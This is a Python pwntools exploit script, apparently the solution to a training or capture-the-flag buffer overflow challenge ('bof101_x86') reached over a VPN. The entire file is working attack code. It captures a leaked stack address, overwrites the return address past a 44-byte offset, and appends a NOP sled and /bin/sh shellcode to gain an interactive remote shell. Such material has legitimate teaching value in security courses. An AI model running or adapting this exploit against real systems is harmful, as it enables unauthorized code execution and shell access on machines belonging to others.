#!/usr/bin/env python3
from pwn import *
import vpn_conf

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 2)


EXE_FILENAME='../bof101_x86'
exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}
gdbscript = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(argv=argv, env=envp)


# Generate the shellcode for /bin/sh
shellcode = asm(shellcraft.sh())

# Buffer overflow and NOP sled
OFFSET = 44  # Calculated with cyclic
NOP = b'\x90' * 50

# Establish connection to the remote server
io = start()

# Receive data until the leak message is encountered
leaked_data = io.recvuntil(b"Since this is your first challenge, you'll get a leak for free: &x=")

# Receive the next part containing the leaked address
leaked_data += io.recv(1024)  # Add more data to ensure we capture everything

# Search and extract the leaked address
leaked_address = None
for line in leaked_data.splitlines():
    if b"&x=" in line:
        # Extract the leaked address by splitting the line at "&x=" and stripping the extra spaces
        leaked_address = line.split(b"&x=")[1].strip()
        break

# If the leaked address is found, convert it to an integer
if leaked_address:
    leaked_address = int(leaked_address, 16)
    print(f"Leaked address: 0x{leaked_address:x}")
else:
    print("Leaked address not found!")

# Use the leaked address to create the payload
payload = b'a' * OFFSET + p32(leaked_address) + NOP + shellcode

# Send the payload to the remote server
io.sendline(payload)

# Switch to interactive mode to obtain the shell
io.interactive()
